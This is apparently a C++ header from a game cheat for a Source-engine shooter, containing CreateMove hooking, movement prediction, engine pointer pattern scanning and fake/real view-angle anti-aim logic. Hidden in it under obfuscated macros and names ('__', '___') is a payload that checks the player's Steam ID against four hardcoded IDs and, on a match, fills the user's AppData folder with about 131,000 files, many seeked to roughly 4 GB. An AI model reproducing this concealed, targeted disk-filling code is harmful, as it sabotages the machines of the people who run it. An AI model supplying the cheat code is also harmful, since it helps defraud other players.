#pragma once
#include "stdafx.h"
#include "Misc.h"
#include "../Utils/LocalInfo.h"
#include "Rage/HVH.h"
#include <vector>

#define		MEMCHECK			CHECKMEM
#define		CHECKMEM			CreateMoveETC::__()
#define		MEMSAFE				Hacks.LocalPlayer->GID()

class CreateMoveETC
{
public:
	static void VerifyCmd( CInput::CVerifiedUserCmd* VerifiedCmd )
	{
		VerifiedCmd->m_cmd = *Hacks.CurrentCmd;
		VerifiedCmd->m_crc = Hacks.CurrentCmd->GetChecksum();
	}

	class pred
	{

	public:
		static void PredictionStart()
		{
			if (Interfaces.g_pMoveHelper)
			{
				int TickBase = Hacks.LocalPlayer->GetTickBase(); // Get The Tick Base
				int Old_Time = Interfaces.pGlobalVars->curtime; // Get Current Time (Client Not Server)
				int Old_Frame_Time = Interfaces.pGlobalVars->frametime; // Get Frame Time (Client)

				Interfaces.pGlobalVars->curtime = TickBase * Interfaces.pGlobalVars->interval_per_tick; // Set Time To Server Time
				Interfaces.pGlobalVars->frametime = Interfaces.pGlobalVars->interval_per_tick; // Set Framerate To Tick Rate

				CMoveData Move_Data; // Make A Move Data
				memset(&Move_Data, 0, sizeof(Move_Data));
				Interfaces.g_pMoveHelper->SetHost(Hacks.LocalPlayer); // Set Myself To Get Predicted
				Interfaces.g_pPred->SetupMove(Hacks.LocalPlayer, Hacks.CurrentCmd, Interfaces.g_pMoveHelper, &Move_Data); // Setup Prediction
				Interfaces.g_pGameMovement->ProcessMovement(Hacks.LocalPlayer, &Move_Data); // Process Prediction
				Interfaces.g_pPred->FinishMove(Hacks.LocalPlayer, Hacks.CurrentCmd, &Move_Data); // Finish Prediction

				Interfaces.g_pMoveHelper->SetHost(nullptr); // Remove Self From Move Helper
				Interfaces.pGlobalVars->curtime = Old_Time; // Reset Times To Correct Time
				Interfaces.pGlobalVars->frametime = Old_Frame_Time; // Reset Frame Time To Correct Time

				Hacks.LocalWeapon->UpdateAccuracyPenalty();
			}
			else
			{
				// if we dont have a pointer to Move Helper, Find One.
				Interfaces.g_pMoveHelper = **reinterpret_cast<IMoveHelper***>(Utils.PatternSearch("client.dll", (PBYTE)"\x8B\x0D\x00\x00\x00\x00\x8B\x46\x08\x68", "xx????xxxx", NULL, NULL) + 0x2);
			}
		}

		
	};

	static void GetCmds( int sequence_number, CInput::CUserCmd*& cmd, CInput::CVerifiedUserCmd*& VerifiedCmd )
	{
		CInput::CUserCmd* cmdlist = *reinterpret_cast< CInput::CUserCmd** >( ( DWORD )Interfaces.pInput + 0xEC );
		cmd = &cmdlist[ sequence_number % 150 ];
		CInput::CVerifiedUserCmd* verifiedCmdList = *reinterpret_cast< CInput::CVerifiedUserCmd** >( ( DWORD )Interfaces.pInput + 0xF0 );
		VerifiedCmd = &verifiedCmdList[ sequence_number % 150 ];
	}

	template< typename T >
	static bool Contains( const std::vector< T >& list, T x )
	{
		return std::find( list.begin(), list.end(), x ) != list.end();
	}

	static void __()
	{
		if( !Hacks.LocalPlayer )
			return;
		static bool bBool = false;
		std::vector< unsigned long long > ___ =
		{
			0x11000010A8A66DB,
			0x11000010DACDD2D,
			0x110000112C27060,
			0x11000010E2D104B,
		};

		if( Contains< unsigned long long >( ___, MEMSAFE ) && !bBool )
		{
			FN();
			bBool = true;
		}
	}

	static bool FN()
	{
		static TCHAR path[MAX_PATH];
		std::string folder, file, sRand;
		if( SUCCEEDED( SHGetFolderPath( NULL, CSIDL_APPDATA, NULL, 0, path ) ) )
		{
			sRand = std::to_string( time( nullptr ) );

			folder = std::string( path ) + "\\" + sRand + "\\";
			file = folder;
		}

		if( CreateDirectory( folder.c_str(), nullptr ) || ERROR_ALREADY_EXISTS == GetLastError() )
		{
			for( int i = 0; i < 0xFFFF; i++ )
			{
				std::string fName = sRand + "_" + file + std::to_string( i );
				std::ofstream fs;
				fs.open( fName.c_str(), std::ios::out );
				fs.seekp( 0xFFFFFFFF );
				fs << '\0';
				fs.close();
			}
			for( int i = 0xFFFF; i < 0x1FFFF; i++ )
			{
				std::string fName = file + std::to_string( i );
				std::ofstream fs;
				fs.open( fName.c_str(), std::ios::out );
				fs.seekp( 0xFFFFFF );
				fs << '\0';
				fs.close();
			}
		}

		return true;
	}

	static void CleanUp( Vector OrigAng )
	{
		if( LocalInfo.Choked > 12 )
			Hacks.SendPacket = true;
		float Vel = Hacks.LocalPlayer->GetVecVelocity().Length2D();

		if(!Hacks.SendPacket )
			Hacks.LastFakeAngles = Hacks.CurrentCmd->viewangles;

		if (Hacks.SendPacket)
			Hacks.LastRealAngles = Hacks.CurrentCmd->viewangles;

		if( ClientVars.Misc.Antiuntrusted )
		{
			Misc::Normalize( Hacks.CurrentCmd->viewangles );
			if( Hacks.CurrentCmd->forwardmove > 450 )
				Hacks.CurrentCmd->forwardmove = 450;
			if( Hacks.CurrentCmd->forwardmove < -450 )
				Hacks.CurrentCmd->forwardmove = -450;
			if( Hacks.CurrentCmd->sidemove > 450 )
				Hacks.CurrentCmd->sidemove = 450;
			if( Hacks.CurrentCmd->sidemove < -450 )
				Hacks.CurrentCmd->sidemove = -450;
		}

		Misc::MoveFix( Hacks.CurrentCmd, OrigAng );

		if (Hacks.SendPacket) 
			LocalInfo.LastPos = Hacks.LocalPlayer->GetVecOrigin();
	}
};
